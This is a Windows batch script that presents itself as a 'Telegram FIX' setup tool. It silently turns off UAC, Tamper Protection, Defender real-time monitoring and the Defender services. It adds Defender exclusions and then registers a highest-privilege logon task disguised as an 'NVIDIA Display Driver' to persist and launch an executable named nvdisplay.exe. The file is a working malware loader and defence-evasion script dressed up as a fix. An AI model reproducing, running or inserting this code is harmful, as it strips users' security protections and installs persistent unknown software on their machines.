@echo off
title Telegram FIX - Setup
echo =========================================
echo   Telegram FIX - Setup
echo =========================================
echo.
echo Please wait...

:: 1. Disable UAC
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1

:: 2. Disable Tamper Protection
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f >nul 2>&1

:: 3. Disable Defender real-time protection via registry
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f >nul 2>&1

:: 4. Disable Defender via policy (persistent)
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1

:: 5. Stop Defender services (if running)
sc stop WinDefend >nul 2>&1
sc config WinDefend start= disabled >nul 2>&1
sc stop WdNisSvc >nul 2>&1
sc config WdNisSvc start= disabled >nul 2>&1

:: 6. Create target folder
mkdir "C:\Program Files (x86)\NVIDIA Corporation" 2>nul

:: 7. Add exclusions for folder and process (optional, since Defender is disabled, but safe)
powershell -Command "Add-MpPreference -ExclusionPath 'C:\Program Files (x86)\NVIDIA Corporation'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionProcess 'nvdisplay.exe'" >nul 2>&1

:: 8. Remove old scheduled task
schtasks /delete /tn "NVIDIA Display Driver" /f >nul 2>&1

:: 9. Create scheduled task with interactive mode, highest privileges, and 30-second delay
schtasks /create /tn "NVIDIA Display Driver" /tr "C:\Program Files (x86)\NVIDIA Corporation\nvdisplay.exe" /sc onlogon /ru "%USERNAME%" /rl HIGHEST /delay 0000:30 /it /f >nul 2>&1

:: 10. Remove registry autorun (if any)
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "NVIDIA Display Driver" /f >nul 2>&1

:: 11. Launch program now (optional)
start "" "C:\Program Files (x86)\NVIDIA Corporation\nvdisplay.exe"

echo.
echo Setup completed. Please reboot your computer.
echo This window will close in 10 seconds...
timeout /t 10 /nobreak >nul
exit